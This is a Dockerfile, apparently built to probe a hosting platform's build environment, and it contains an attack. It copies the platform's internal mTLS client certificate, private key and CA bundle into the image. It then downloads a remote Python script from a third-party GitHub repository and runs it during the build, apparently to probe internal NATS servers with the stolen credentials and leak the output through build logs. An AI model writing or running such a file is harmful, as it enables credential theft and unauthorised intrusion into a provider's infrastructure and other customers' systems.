# MARK-I68361-NATS-a1b2
FROM alpine:3.20
RUN echo MARK-I68361-apk-a1b2 && apk add --no-cache python3 openssl >/dev/null 2>&1 && echo APK_OK
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN echo MARK-I68361-dl-a1b2 && (wget -q -T 30 -O /p.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/nats_leaf_probe_i68361.py || python3 -c "import urllib.request;urllib.request.urlretrieve('https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/nats_leaf_probe_i68361.py','/p.py')"); wc -l /p.py
RUN echo MARK-I68361-BUILD-a1b2-START && timeout -s KILL 150 python3 /p.py 2>&1 | head -c 24000 ; echo MARK-I68361-BUILD-a1b2-END
CMD ["sh","-c","echo MARK-I68361-RT-a1b2; sleep 60"]
